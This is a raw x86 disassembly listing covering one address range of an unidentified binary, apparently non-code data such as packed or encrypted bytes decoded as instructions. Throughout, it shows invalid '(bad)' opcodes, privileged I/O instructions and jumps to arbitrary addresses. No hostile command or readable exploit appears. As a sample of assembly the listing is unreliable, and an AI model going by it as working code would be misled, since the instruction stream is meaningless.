  419463:	out    dx,eax
  419464:	shr    dl,cl
  419466:	mov    ebx,0xfdfdc8cc
  41946b:	(bad)  
  41946c:	std    
  41946d:	call   0xc13c7040
  419472:	clc    
  419473:	cmc    
  419474:	sti    
  419475:	aam    0xe6
  419477:	or     eax,eax
  419479:	in     eax,dx
  41947a:	cld    
  41947b:	fmul   st,st(1)
  41947d:	in     eax,dx
  41947e:	iret   
  41947f:	in     eax,0xb0
  419481:	iret   
  419482:	(bad)  
  419483:	out    dx,eax
  419484:	loopne 0x419470
  419486:	mov    dh,0xff
  419488:	bnd call 0xda338587
  41948e:	mov    edx,0xbef8dcdf
  419493:	rcl    dl,0xfa
  419496:	or     dh,dh
  419498:	not    ch
  41949a:	mov    DWORD PTR [eax],0xc7b8fc04
  4194a0:	rcl    bl,0xc9
  4194a3:	shr    DWORD PTR [edi+ebp*8-0xa2a0f4a],cl
  4194aa:	mov    ebx,0xecbeebf1
  4194af:	fsubr  st(3),st
  4194b1:	fild   DWORD PTR [ebx+ebp*8]
  4194b4:	jecxz  0x41949c
  4194b6:	push   es
  4194b7:	clc    
  4194b8:	jmp    0x4194b2
  4194ba:	add    al,0xea
  4194bc:	pavgw  mm6,QWORD PTR [ebx-0x181b4d4f]
  4194c3:	fcomi  st,st(2)
  4194c5:	xlat   BYTE PTR ds:[ebx]
  4194c6:	jmp    0xe2d2:0xeee5ebcd
  4194cd:	(bad)  
  4194cf:	add    bl,dh
  4194d1:	rcl    bl,1
  4194d3:	lock add eax,0xd5eabf06
  4194d9:	add    bh,bl
  4194db:	sti    
  4194dc:	retf   0xc0c8
  4194df:	loopne 0x4194d8
  4194e1:	in     eax,0xe9
  4194e3:	call   0xee0f5a98
  4194e8:	iret   
  4194e9:	retf   0xd9ca
  4194ec:	jecxz  0x4194ca
  4194ee:	mov    ebx,0xe4dbdbe7
  4194f3:	fadd   DWORD PTR [ecx]
  4194f5:	add    ch,dl
  4194f7:	(bad)  
  4194f9:	fadd   st(7),st
  4194fb:	or     cl,al
  4194fd:	cli    
  4194fe:	out    0xe0,eax
  419500:	(bad)
  419503:	out    0xe2,al
  419505:	mov    dl,0xb5
  419507:	in     al,0xba
  419509:	std    
  41950a:	out    dx,al
  41950b:	aad    0xd2
  41950d:	jmp    0xd43053d3
  419512:	in     eax,0xdc
  419514:	lock fcmovb st,st(1)
  419517:	(bad)  
  419518:	idiv   ebp
  41951a:	loopne 0x4194e2
  41951c:	dec    DWORD PTR [ebx]
  41951e:	int3   
  41951f:	jmp    0xd1f743ea
  419524:	retf   0xe4ed
  419527:	mov    ah,0xbb
  419529:	mov    eax,0xcab5f7fc
  41952e:	in     al,dx
  41952f:	int    0xcd
  419531:	sti    
  419532:	pop    es
  419533:	not    ebp
  419535:	stc    
  419536:	(bad)  
  419537:	(bad)  
  419539:	add    ebp,edx
  41953b:	enter  0xc4f3,0xe1
  41953f:	scas   al,BYTE PTR es:[edi]
  419540:	repz aad 0xcf
  419543:	in     eax,dx
  419544:	ret    0xb9f4
  419547:	test   dh,0xf5
  41954a:	(bad)  
  41954b:	fidivr DWORD PTR [ecx+0x3f0ecdd]
  419551:	add    ebp,ebp
  419553:	xlat   BYTE PTR ds:[ebx]
  419554:	repnz mov esp,0xfde07f8
  41955a:	retf   0xe7fb
  41955d:	rol    dh,0xb0
  419560:	test   al,0xb3
  419562:	jecxz  0x41953f
  419564:	call   0xc01b904f
  419569:	mov    eax,0xc3b803d6
  41956e:	iret   
  41956f:	std    
  419570:	sti    
  419571:	add    DWORD PTR ds:0xfddadbd3,eax
  419577:	jmp    0xef416087
  41957c:	or     eax,0xf0c0e9d3
  419581:	mov    esi,0xede1e1c4
  419586:	mov    cl,0xda
  419588:	in     al,0xc6
  41958a:	fistp  QWORD PTR [ebp-0x262b3c42]
  419590:	out    0xdc,al
  419592:	mov    esp,0x6cbd2
  419597:	xlat   BYTE PTR ds:[ebx]
  419598:	fcomp  st(1)
  41959a:	jecxz  0x4195a1
  41959c:	(bad)  
  41959f:	out    dx,al
  4195a0:	iret   
  4195a1:	jmp    0xf40d6271
  4195a6:	stc    
  4195a7:	hlt    
  4195a8:	cmc    
  4195a9:	repnz out dx,eax
  4195ab:	dec    dh
  4195ad:	rcl    dh,cl
  4195af:	add    esi,ebp
  4195b1:	fadd   QWORD PTR [edi]
  4195b3:	(bad)  
  4195b5:	ret    0xeff9
  4195b8:	or     ebx,ecx
  4195ba:	fisttp DWORD PTR [edi]
  4195bc:	fucomp st(2)
  4195be:	retf   0xece9
  4195c1:	(bad)  
  4195c2:	int3   
  4195c3:	aam    0xda
  4195c5:	(bad)  
  4195c6:	enter  0xecf2,0xca
  4195ca:	call   0xe31094a4
  4195cf:	pop    es
  4195d0:	cmc    
  4195d1:	fiadd  DWORD PTR [edx]
  4195d3:	loopne 0x419595
  4195d5:	ret    0xc5f0
  4195d8:	ror    DWORD PTR [ecx],0xf8
  4195db:	add    al,0xfa
  4195dd:	pextrw esp,(bad),0xc5
  4195df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195e0:	(bad)  
  4195e1:	aad    0xe9
  4195e3:	rcl    dl,cl
  4195e5:	lods   al,BYTE PTR ds:[esi]
  4195e6:	sar    DWORD PTR [edx-0x9220e3c],1
  4195ec:	jmp    0xf9fd:0xd8d9d6
  4195f3:	(bad)  
  4195f4:	fadd   DWORD PTR [ebx]
  4195f6:	add    ebp,ebx
  4195f8:	enter  0xdcde,0xf4
  4195fc:	add    al,0x8
  4195fe:	shl    DWORD PTR [edx-0x3b121339],0xcc
  419605:	rcl    ebp,0xc7
  419608:	icebp  
  419609:	call   edx
  41960b:	in     eax,dx
  41960c:	jmp    0xf73865ff
  419611:	repnz mov ebx,0xf80703d2
  419617:	cli    
  419618:	or     esp,ebp
  41961a:	ret    
  41961b:	or     al,0x4
  41961d:	clc    
  41961e:	in     al,dx
  41961f:	sar    BYTE PTR [ebp-0x4d37510d],cl
  419625:	int    0xd5
  419627:	call   0xfa3b6421
  41962c:	loop   0x419623
  41962e:	(bad)  
  41962f:	lock repnz hlt 
  419632:	clc    
  419633:	f2xm1  
  419635:	add    eax,ebp
  419637:	out    dx,eax
  419638:	loopne 0x419647
  41963a:	fadd   DWORD PTR [edi]
  41963c:	repnz stc 
  41963e:	shr    bh,cl
  419640:	ret    0xf4de
  419643:	mov    ah,0xd6
  419645:	(bad)  
  419646:	enter  0xdbda,0xfd
  41964a:	call   0xd9325347
  41964f:	loope  0x419611
  419651:	out    0xd3,eax
  419653:	fdivrp st(7),st
  419655:	sar    esi,1
  419657:	loope  0x41961f
  419659:	(bad)  
  41965a:	clc    
  41965b:	add    eax,0xf0d3d9ef
  419660:	ret    
  419661:	div    BYTE PTR [ebx-0x1f14364a]
  419667:	repnz mov edx,0xe2faf8f9
  41966d:	out    dx,eax
  41966e:	mov    eax,0xfbfcdfee
  419673:	(bad)
  419676:	add    al,ch
  419678:	jmp    0xe84f7343
  41967d:	(bad)  
  41967f:	mov    ecx,0xe2c6cdbe
  419685:	mov    bl,0xe4
  419687:	icebp  
  419688:	out    dx,al
  419689:	mov    ebx,0xd103b5f5
  41968e:	(bad)  
  41968f:	out    0xf0,eax
  419691:	cmc    
  419692:	cmc    
  419693:	add    al,0xbd
  419695:	hlt    
  419696:	pop    es
  419697:	(bad)  
  419699:	iret   
  41969a:	hlt    
  41969b:	into   
  41969c:	loopne 0x419676
  41969e:	(bad)  
  41969f:	out    dx,eax
  4196a0:	out    dx,al
  4196a1:	scas   eax,DWORD PTR es:[edi]
  4196a2:	int    0xc7
  4196a4:	mov    cl,0xcd
  4196a6:	mov    al,0xd0
  4196a8:	(bad)  
  4196a9:	mov    al,0xdf
  4196ab:	cli    
  4196ac:	sar    esi,cl
  4196ae:	cmc    
  4196af:	aad    0xcf
  4196b1:	(bad)  
  4196b3:	cmc    
  4196b4:	shl    ebx,0x6
  4196b7:	sti    
  4196b8:	idiv   BYTE PTR [ebp+ecx*1-0x5232f1f8]
  4196bf:	repz (bad) 
  4196c2:	jecxz  0x419672
  4196c4:	lods   eax,DWORD PTR ds:[esi]
  4196c5:	stc    
  4196c6:	out    dx,al
  4196c7:	shr    edx,1
  4196c9:	sti    
  4196ca:	jmp    0x4196a5
  4196cc:	mov    ebp,0xc3ffc9f6
  4196d1:	add    eax,0xfa04e1bd
  4196d6:	std    
  4196d7:	shl    ah,1
  4196d9:	jmp    0x4196c8
  4196db:	out    dx,eax
  4196dc:	or     ebx,ecx
  4196de:	(bad)  
  4196e0:	in     eax,0xae
  4196e2:	mov    cl,0xc6
  4196e4:	sar    DWORD PTR [ebx-0x2a1b1510],1
  4196ea:	into   
  4196eb:	jecxz  0x4196c4
  4196ed:	add    esi,ecx
  4196ef:	loopne 0x4196f1
  4196f1:	add    edi,edx
  4196f3:	or     edi,edx
  4196f5:	icebp  
  4196f6:	add    ebx,edi
  4196f8:	push   es
  4196f9:	loope  0x4196d5
  4196fb:	in     al,0x12
  4196fd:	loope  0x4196b8
  4196ff:	mov    al,0xb1
  419701:	ret    
  419702:	call   0xf20444c8
  419707:	clc    
  419708:	mov    edx,0xf9d0d4de
  41970d:	jecxz  0x4196cd
  41970f:	cld    
  419710:	rol    DWORD PTR ds:0x5dad7de,1
  419716:	(bad)  
  419717:	fsub   st(3),st
  419719:	or     esp,esp
  41971b:	in     al,dx
  41971c:	cli    
  41971d:	repnz rcr ch,0xae
  419721:	leave  
  419722:	ror    cl,1
  419724:	out    0xe7,al
  419726:	retf   
  419727:	shr    dh,1
  419729:	mov    esi,0xeadbf2be
  41972e:	(bad)  
  419730:	int    0xf6
  419732:	(bad)  
  419733:	fdivrp st(6),st
  419735:	retf   
  419736:	aam    0xdf
  419738:	femms  
  41973a:	or     bl,bl
  41973c:	repz or ebp,ebp
  41973f:	shl    BYTE PTR [ecx-0x3f1d0f1c],1
  419745:	hlt    
  419746:	retf   
  419747:	cmc    
  419748:	(bad)  
  419749:	mov    edx,0xddb4dbef
  41974e:	loope  0x419743
  419750:	shl    al,0xf5
  419753:	clc    
  419754:	(bad)  
  419756:	(bad)  
  419757:	fisttp WORD PTR [ecx]
  419759:	(bad)  
  41975b:	stc    
  41975c:	jmp    0xf41f554b
  419761:	mov    bh,0xbd
  419763:	hlt    
  419764:	mul    ebp
  419766:	loope  0x419742
  419768:	(bad)  
  419769:	in     eax,dx
  41976a:	std    
  41976b:	retf   0x2d3
  41976e:	in     al,dx
  41976f:	in     eax,dx
  419770:	div    edi
  419772:	fnstsw WORD PTR [ebp+edx*8-0x2a25070c]
  419779:	in     al,0xb
  41977b:	int    0xc1
  41977d:	iret   
  41977e:	test   al,0xf0
  419780:	faddp  st(5),st
  419782:	div    bl
  419784:	mov    ch,0xd4
  419787:	hlt    
  419788:	fnstcw WORD PTR [eax-0x1172936]
  41978e:	mov    ebp,0xdee0c3db
  419793:	int3   
  419794:	fcmovne st,st(2)
  419796:	loop   0x419774
  419798:	push   es
  419799:	push   cs
  41979a:	add    ecx,esp
  41979c:	int    0xe4
  41979e:	lock ret 
  4197a0:	shl    edx,0xf4
  4197a3:	mov    bl,0xe8
  4197a5:	loop   0x419774
  4197a7:	mov    dl,0xd6
  4197a9:	aam    0xba
  4197ab:	retf   0xc8ba
  4197ae:	lock mov esp,0xe1c5d5d6
  4197b4:	ror    BYTE PTR [ebx],1
  4197b6:	lock jmp 0x4197ba
  4197b9:	into   
  4197ba:	fcmovu st,st(0)
  4197bc:	or     eax,0xc0a8deda
  4197c1:	out    0xe4,eax
  4197c3:	sti    
  4197c4:	(bad)  
  4197c5:	jmp    0xc62066c5
  4197ca:	fdivrp st(0),st
  4197cc:	mov    ch,0xce
  4197ce:	fcom   st(1)
  4197d0:	(bad)  
  4197d2:	cld    
  4197d3:	mul    ebp
  4197d5:	add    BYTE PTR ds:0xd4ced5be,al
  4197db:	add    ebx,edi
  4197dd:	push   es
  4197de:	shr    BYTE PTR [edx-0x9304318],1
  4197e4:	out    dx,eax
  4197e5:	shl    BYTE PTR [esi+eiz*8-0x130a2d10],cl
  4197ec:	int3   
  4197ed:	cmc    
  4197ee:	(bad)  
  4197f0:	add    ah,ch
  4197f2:	icebp  
  4197f3:	ror    BYTE PTR [ebx],1
  4197f5:	std    
  4197f6:	icebp  
  4197f7:	(bad)  
  4197f8:	jmp    0x4197f4
  4197fa:	or     eax,DWORD PTR [edi]
  4197fc:	cli    
  4197fd:	cld    
  4197fe:	loop   0x4197e7
  419800:	scas   eax,DWORD PTR es:[edi]
  419801:	test   al,0xaf
  419803:	out    0xd0,eax
  419805:	loopne 0x4197d1
  419807:	sti    
  419808:	mov    ecx,0xb8beeee6
  41980d:	mov    esp,0xc1c7cff8
  419812:	ret    0xd9d9
  419815:	fmul   st,st(3)
  419817:	xlat   BYTE PTR ds:[ebx]
  419818:	fcmovne st,st(7)
  41981a:	out    0xe7,al
  41981c:	jmp    0xb1cd:0xe1a6c6e5
  419823:	mov    dl,0xc7
  419825:	icebp  
  419826:	stc    
  419827:	int3   
  419828:	retf   
  419829:	retf   0xfbfc
  41982c:	mov    edi,0xfbe0dcfa
  419831:	hlt    
  419832:	mov    DWORD PTR [esi],0xbe01e0c5
  419838:	or     ah,ah
  41983a:	(bad)  
  41983b:	(bad)  
  41983d:	shl    ah,cl
  41983f:	jmp    0xc5145e33
  419844:	jecxz  0x41981c
  419846:	mov    dh,0xee
  419848:	mov    edx,0xecf6b5d5
  41984d:	ror    al,cl
  41984f:	loopne 0x419850
  419851:	repnz add esp,ebx
  419854:	fcmovnb st,st(7)
  419856:	clc    
  419857:	(bad)  
  419858:	div    ebp
  41985a:	jmp    0xb920645f
  41985f:	loope  0x419847
  419861:	ret    
  419862:	mov    ch,0xd0
  419864:	(bad)  
  419865:	repz shl ecx,1
  419868:	les    ebp,FWORD PTR [esi+ecx*8-0xb211246]
  41986f:	sar    DWORD PTR [edi-0x2d4109],0xb8
  419876:	dec    BYTE PTR [eax]
  419878:	inc    edi
  41987a:	clc    
  41987b:	dec    dh
  41987d:	repz rcl ebx,0xf3
  419881:	into   
  419882:	ror    cl,0xf1
  419885:	fchs   
  419887:	in     eax,0xb5
  419889:	in     al,dx
  41988a:	mov    bh,0xbf
  41988c:	loop   0x41986f
  41988e:	cli    
  41988f:	neg    esi
  419891:	inc    DWORD PTR [esi]
  419893:	ret    0xdb03
  419896:	add    al,0xd5
  419898:	retf   0xfacb
  41989b:	add    BYTE PTR ds:0xedadd30c,cl
  4198a1:	in     eax,0xcb
  4198a3:	ret    0xc9d0
  4198a6:	out    0xf0,eax
  4198a8:	mov    ebx,0xf5deeaf5
  4198ad:	in     eax,dx
  4198ae:	aad    0xe7
  4198b0:	mov    ecx,0xcbc100d0
  4198b5:	push   es
  4198b6:	(bad)  
  4198b7:	aad    0xc1
  4198b9:	add    al,0xc4
  4198bb:	or     eax,0xeee5c40f
  4198c0:	(bad)  
  4198c1:	repz out 0xc3,eax
  4198c4:	out    0xce,al
  4198c6:	retf   
  4198c7:	cmc    
  4198c8:	out    dx,eax
  4198c9:	out    dx,al
  4198ca:	mov    dh,0xd6
  4198cc:	mov    ecx,0xffedd8dc
  4198d1:	fld    DWORD PTR [ecx]
  4198d3:	(bad)  
  4198d5:	loope  0x4198af
  4198d7:	add    bh,dh
  4198d9:	(bad)  
  4198db:	out    0xec,al
  4198dd:	les    ebp,FWORD PTR [ebp-0x2b571731]
  4198e3:	jmp    0x4198ab
  4198e5:	lock loopne 0x4198d5
  4198e8:	mov    ah,0xff
  4198ea:	out    dx,al
  4198eb:	in     eax,dx
  4198ec:	jecxz  0x4198df
  4198ee:	mov    ebx,0xdcd400d0
  4198f3:	loope  0x4198ff
  4198f5:	in     al,0xfe
  4198f7:	ret    0xdee1
  4198fa:	push   cs
  4198fb:	out    dx,al
  4198fc:	pop    es
  4198fd:	int3   
  4198fe:	(bad)  
  4198ff:	jmp    0x4198b2
  419901:	int3   
  419902:	out    0xd2,al
  419904:	out    dx,eax
  419905:	into   
  419906:	fcmovne st,st(5)
  419908:	out    dx,eax
  419909:	vpsubusw ymm5,ymm6,ymm4
  41990d:	jmp    0x7e6:0xe0f3fbd8
  419914:	loop   0x4198f2
  419916:	xlat   BYTE PTR ds:[ebx]
  419917:	add    eax,0xde00dee2
  41991c:	add    eax,0xf6f3cf0a
  419921:	jecxz  0x4198e8
  419923:	icebp  
  419924:	mov    bl,0xee
  419926:	in     al,dx
  419927:	stc    
  419928:	iret   
  419929:	out    dx,al
  41992a:	repz mov ch,0xd2
  41992d:	aad    0xfb
  41992f:	loopne 0x4198ee
  419931:	dec    ch
  419933:	add    esp,esp
  419935:	loopne 0x41993e
  419937:	mov    BYTE PTR [edx+ecx*1],0xe3
  41993b:	hlt    
  41993c:	dec    ebx
  41993e:	bnd ret 0xbce7
  419942:	call   0xb1f48735
  419947:	fcmovnu st,st(6)
  419949:	jmp    0xd1f3:0xdcb5e4e9
  419950:	mov    ch,0xcd
  419952:	int3   
  419953:	add    edx,ebp
  419955:	mov    esi,0xe4bc0e09
  41995b:	in     al,dx
  41995c:	fld    QWORD PTR ds:0xb1c4cdb2
  419962:	loope  0x419914
  419964:	rol    al,1
  419966:	in     eax,0xc7
  419968:	rcr    bh,1
  41996a:	mov    eax,0xfef3dbdd
  41996f:	add    edi,eax
  419971:	mov    eax,0xddffffe3
  419976:	(bad)  
  419978:	clc    
  419979:	fcmovb st,st(7)
  41997b:	(bad)  
  41997c:	out    dx,al
  41997d:	loope  0x41992a
  41997f:	out    0xdc,eax
  419981:	(bad)  
  419983:	retf   0xf7c4
  419986:	(bad)
  419989:	fidivr WORD PTR [edi+0x1f5baf1]
  41998f:	mov    edi,0xdad7f0df
  419994:	add    ch,ah
  419996:	fcomp  st(1)
  419998:	jmp    0xd934a35d
  41999d:	fidiv  WORD PTR [ebx-0x3f092e1b]
  4199a3:	in     al,0xb0
  4199a5:	shl    BYTE PTR [ebp-0xa342e4a],cl
  4199ab:	mov    esp,0xec00f3b9
  4199b0:	fstp   st(4)
  4199b2:	loopne 0x419988
  4199b4:	fucomip st,st(3)
  4199b6:	add    bl,cl
  4199b8:	loop   0x419998
  4199ba:	or     eax,0xedeb05ef
  4199bf:	mov    dl,0xce
  4199c1:	lock out 0xee,eax
  4199c4:	jecxz  0x41997a
  4199c6:	shl    edi,0xe5
  4199c9:	mov    ch,0xd9
  4199cb:	mov    ebx,0xb9cdb4fc
  4199d0:	jecxz  0x4199d7
  4199d2:	pop    es
  4199d3:	fadd   DWORD PTR [edx]
  4199d5:	fiadd  WORD PTR [ecx]
  4199d7:	(bad)  
  4199d8:	retf   0xf9c9
  4199db:	add    ecx,edx
  4199dd:	int    0xc6
  4199df:	(bad)  
  4199e0:	in     al,0xef
  4199e2:	retf   0xf4d2
  4199e5:	out    0xca,eax
  4199e7:	cmc    
  4199e8:	in     al,dx
  4199e9:	cmc    
  4199ea:	rol    BYTE PTR [ebx],cl
  4199ec:	sti    
  4199ed:	clc    
  4199ee:	add    edi,esp
  4199f0:	aam    0xe7
  4199f2:	fimul  WORD PTR [ebx]
  4199f4:	mov    esp,0xf4d905d4
  4199f9:	out    0xd8,al
  4199fb:	out    0xc9,eax
  4199fd:	out    dx,eax
  4199fe:	in     eax,0xd7
  419a00:	mov    bl,0xcc
  419a02:	jecxz  0x4199d0
  419a04:	in     al,dx
  419a05:	mov    bl,0xe6
  419a07:	out    0xf5,al
  419a09:	mov    edi,0xb0f5f3c4
  419a0e:	div    bh
  419a10:	mov    esi,0xddbddbd2
  419a15:	push   es
  419a16:	sti    
  419a17:	pop    es
  419a18:	(bad)  
  419a1a:	or     ebx,edi
  419a1c:	retf   0xc00c
  419a1f:	loopne 0x419a14
  419a21:	lods   eax,DWORD PTR ds:[esi]
  419a22:	loop   0x4199ce
  419a24:	enter  0xfaf3,0xdf
  419a28:	(bad)  
  419a29:	stc    
  419a2a:	in     eax,dx
  419a2b:	(bad)  
  419a2c:	retf   0xe2d3
  419a2f:	ret    
  419a30:	stc    
  419a31:	fadd   DWORD PTR [edi]
  419a33:	not    ebx
  419a35:	jmp    0x419a12
  419a37:	fsubp  st(0),st
  419a39:	pmullw mm1,mm4
  419a3c:	retf   
  419a3d:	jmp    0x419a2e
  419a3f:	jmp    0xc7ac:0xaee0d1e1
  419a46:	clc    
  419a47:	sti    
  419a48:	mov    dh,0xcf
  419a4a:	dec    esi
  419a4c:	jecxz  0x419a40
  419a4e:	add    al,dl
  419a50:	mov    esp,0xc7ffdebc
  419a55:	ror    BYTE PTR [ecx],1
  419a57:	aam    0xcf
  419a59:	cld    
  419a5a:	leave  
  419a5b:	iret   
  419a5c:	int3   
  419a5d:	adc    ah,al
  419a5f:	mov    edi,0xadb5edb7
  419a64:	out    0xd4,eax
  419a66:	aad    0xec
  419a68:	int3   
  419a69:	retf   0xb8d2
  419a6c:	shl    esp,1
  419a6e:	mov    eax,0xccf3dec3
  419a73:	out    0xf4,eax
  419a75:	loopne 0x419a74
  419a77:	fild   WORD PTR [eax+eax*8]
  419a7a:	(bad)  
  419a7c:	in     eax,0x13
  419a7e:	shl    DWORD PTR [ebx-0x93e2120],1
  419a84:	loope  0x419a5f
  419a86:	neg    al
  419a88:	aad    0xd2
  419a8a:	mov    ah,0xbc
  419a8c:	retf   0xdcf7
  419a8f:	hlt    
  419a90:	(bad)  
  419a92:	in     al,0x1
  419a94:	in     eax,0xe1
  419a96:	ret    0xded6
  419a99:	(bad)  
  419a9a:	in     al,0x1
  419a9c:	rol    DWORD PTR [ecx],cl
  419a9e:	int3   
  419a9f:	ffree  st(6)
  419aa1:	fisubr WORD PTR [esi-0x18093c1b]
  419aa7:	shl    ah,cl
  419aa9:	(bad)  
  419aaa:	in     eax,dx
  419aab:	mov    ecx,0xfebcb4fb
  419ab0:	ret    
  419ab1:	fsubr  st(1),st
  419ab3:	cli    
  419ab4:	rcr    cl,0x4
  419ab7:	mov    esi,0xe6dcfdbd
  419abc:	jmp    0xc22c6cc6
  419ac1:	out    0xc4,al
  419ac3:	in     al,dx
  419ac4:	icebp  
  419ac5:	out    0xe1,eax
  419ac7:	sti    
  419ac8:	aam    0xc4
  419aca:	neg    ch
  419acc:	(bad)  
  419acd:	clc    
  419ace:	fcom   st(7)
  419ad0:	clc    
  419ad1:	ret    
  419ad2:	mov    ebx,0x2f5c6f2
  419ad7:	lock sysret 
  419ada:	dec    ecx
  419adc:	fcmovnb st,st(4)
  419ade:	scas   eax,DWORD PTR es:[edi]
  419adf:	(bad)  
  419ae1:	scas   al,BYTE PTR es:[edi]
  419ae2:	imul   ebx
  419ae4:	shr    BYTE PTR [eax-0x2c161506],1
  419aea:	(bad)  
  419aeb:	aad    0xe2
  419aed:	fild   WORD PTR [edx]
  419aef:	rcl    dh,cl
  419af1:	rol    DWORD PTR [edx],cl
  419af3:	clc    
  419af4:	hlt    
  419af5:	jmp    eax
  419af7:	or     dh,al
  419af9:	add    edi,ebx
  419afb:	ret    0xcb0c
  419afe:	jecxz  0x419ac1
  419b00:	rol    ebp,cl
  419b02:	shr    cl,1
  419b04:	call   0xd9194aeb
  419b09:	retf   
  419b0a:	in     eax,0xe8
  419b0c:	mov    cl,0xef
  419b0e:	fsubp  st(0),st
  419b10:	fstp   TBYTE PTR [ebp+eiz*8-0x3c2d3e2e]
  419b17:	stc    
  419b18:	std    
  419b19:	or     edx,edi
  419b1b:	stc    
  419b1c:	stc    
  419b1d:	adc    cl,bl
  419b1f:	in     eax,0xc0
  419b21:	icebp  
  419b22:	leave  
  419b23:	in     eax,dx
  419b24:	mov    dh,0xcb
  419b26:	mov    edx,0xccacf7f6
  419b2b:	out    dx,al
  419b2c:	repz iret 
  419b2e:	add    ah,dl
  419b30:	push   es
  419b31:	fcmovnb st,st(1)
  419b33:	in     eax,0xc2
  419b35:	or     ebx,edx
  419b37:	or     al,BYTE PTR [esi]
  419b39:	out    dx,al
  419b3a:	add    al,0x5
  419b3c:	into   
  419b3d:	ftst   
  419b3f:	shl    DWORD PTR [ebx-0x1d0d5149],cl
  419b45:	int3   
  419b46:	out    0xc4,eax
  419b48:	mov    eax,0xdab8ecb0
  419b4d:	loope  0x419b0c
  419b4f:	(bad)  
  419b51:	rol    edi,0x1
  419b54:	aam    0xd8
  419b56:	jmp    0xe6d4:0xe8c9c0e9
  419b5d:	in     al,dx
  419b5e:	leave  
  419b5f:	loopne 0x419b29
  419b61:	ror    edi,1
  419b63:	mov    ch,0xeb
  419b65:	loopne 0x419b4e
  419b67:	fstp   TBYTE PTR [edx-0xf171a14]
  419b6d:	not    esp
  419b6f:	repz repz fcom st(5)
  419b73:	(bad)  
  419b74:	mov    BYTE PTR ds:0x6e8f8f0,0xe3
  419b7b:	int3   
  419b7c:	(bad)  
  419b7e:	scas   eax,DWORD PTR es:[edi]
  419b7f:	jmp    0xe8d7:0xc1d0cae8
  419b86:	imul   edx
  419b88:	cli    
  419b89:	shr    al,cl
  419b8b:	mov    edx,0xefe2feea
  419b90:	call   esp
  419b92:	push   es
  419b93:	out    0xb,eax
  419b95:	(bad)  
  419b97:	shl    ebx,0xfe
  419b9a:	or     eax,0xaed2fbee
  419b9f:	(bad)  
  419ba1:	ret    
  419ba2:	rcl    ebx,cl
  419ba4:	in     eax,dx
  419ba5:	cmc    
  419ba6:	mov    bl,0xcf
  419ba8:	jmp    0xdcb9:0xcee9ebea
  419baf:	cmc    
  419bb0:	in     al,dx
  419bb1:	rcl    ebp,1
  419bb3:	repz clc 
  419bb5:	loopne 0x419baf
  419bb7:	in     eax,0xef
  419bb9:	(bad)  [eax]
  419bbb:	add    al,0xe7
  419bbd:	std    
  419bbe:	fild   QWORD PTR [eax-0x234f0e09]
  419bc4:	jecxz  0x419bb1
  419bc6:	into   
  419bc7:	sar    dh,cl
  419bc9:	std    
  419bca:	in     eax,dx
  419bcb:	clc    
  419bcc:	in     eax,dx
  419bcd:	ret    0xfed5
  419bd0:	cld    
  419bd1:	out    dx,al
  419bd2:	loopne 0x419bb2
  419bd4:	(bad)  
  419bd5:	out    0xff,al
  419bd7:	or     ah,dh
  419bd9:	or     eax,0x8fef4
  419bde:	mov    esi,0xe5e4d6d7
  419be3:	mov    dl,0xcc
  419be5:	lock mov dl,0xcf
  419be8:	(bad)  
  419bea:	mov    ebx,0xd001f0ed
  419bef:	rcl    bl,0x3
  419bf2:	mov    ebp,0xc3e2d7d6
  419bf7:	mov    esi,0xbc4c7e6
  419bfc:	fucomi st,st(4)
  419bfe:	loope  0x419bcd
  419c00:	shl    dh,1
  419c02:	fmul   st(5),st
  419c04:	ror    dl,cl
  419c06:	aad    0xca
  419c08:	sar    edx,1
  419c0a:	mov    eax,0xd2f7debf
  419c0f:	mov    edi,0xfbede0f0
  419c14:	cld    
  419c15:	in     eax,0xe1
  419c17:	ret    0xc9ff
  419c1a:	pop    es
  419c1b:	int    0x0
  419c1d:	std    
  419c1e:	in     eax,0xaa
  419c20:	test   eax,0xe9efc8af
  419c25:	jmp    0xe8ce:0xd3c9bac8
  419c2c:	out    dx,eax
  419c2d:	in     al,dx
  419c2e:	shl    al,cl
  419c30:	fld    QWORD PTR [edi]
  419c32:	cld    
  419c33:	out    0xc0,al
  419c35:	icebp  
  419c36:	add    cl,ah
  419c38:	jecxz  0x419c3e
  419c3a:	out    0xf3,al
  419c3c:	out    dx,eax
  419c3d:	std    
  419c3e:	repnz faddp st(4),st
  419c41:	loopne 0x419c12
  419c43:	out    dx,eax
  419c44:	retf   0xf1b4
  419c47:	(bad)
  419c4a:	mov    ah,0xf9
  419c4c:	(bad)  
  419c4d:	out    dx,eax
  419c4e:	add    DWORD PTR [ecx],eax
  419c50:	loop   0x419c4f
  419c52:	cmc    
  419c53:	neg    ch
  419c55:	or     edi,eax
  419c57:	add    al,0xf7
  419c59:	(bad)  
  419c5a:	jmp    0xaa0e8444
  419c5f:	ret    0xc4e5
  419c62:	out    0xb3,al
  419c64:	retf   
  419c65:	enter  0xd3b6,0xce
  419c69:	jmp    0x419c28
  419c6b:	cmc    
  419c6c:	mov    ecx,0xd1c302d8
  419c71:	into   
  419c72:	(bad)  
  419c73:	inc    cl
  419c75:	neg    edi
  419c77:	or     BYTE PTR [esi],cl
  419c79:	out    0xfd,eax
  419c7b:	in     eax,dx
  419c7c:	or     BYTE PTR [edi],cl
  419c7e:	out    dx,eax
  419c7f:	shr    ebp,0xe6
  419c82:	repz fninit 
  419c85:	retf   
  419c86:	mov    ebx,0xcfcfeff9
  419c8b:	(bad)  
  419c8d:	(bad)  
  419c8e:	in     al,dx
  419c8f:	repnz add dl,dl
  419c92:	div    cl
  419c94:	xlat   BYTE PTR ds:[ebx]
  419c95:	ret    0xd6ff
  419c98:	add    edi,DWORD PTR [esp+eax*8-0x37fe3005]
  419c9f:	loopne 0x419c8a
  419ca1:	repz in al,dx
  419ca3:	aad    0xda
  419ca5:	call   0xf6185874
  419caa:	int3   
  419cab:	jmp    0x419ca7
  419cad:	in     al,dx
  419cae:	(bad)  
  419cb0:	xlat   BYTE PTR ds:[ebx]
  419cb1:	mov    esp,0xfff4e0f3
  419cb6:	(bad)  
  419cb7:	or     esp,ebx
  419cb9:	out    0xdd,eax
  419cbb:	in     eax,dx
  419cbc:	in     eax,0xf1
  419cbe:	out    dx,eax
  419cbf:	mov    eax,0xe5c1e5d6
  419cc4:	loop   0x419cbf
  419cc6:	retf   
  419cc7:	in     al,dx
  419cc8:	fcomp  st(7)
  419cca:	mov    edi,0xffcaea03
  419ccf:	out    0xc2,eax
  419cd1:	aam    0xf8
  419cd3:	(bad)  
  419cd4:	(bad)  
  419cd6:	leave  
  419cd7:	retf   0xd50f
  419cda:	out    dx,al
  419cdb:	sti    
  419cdc:	stc    
  419cdd:	enter  0xb2b2,0xae
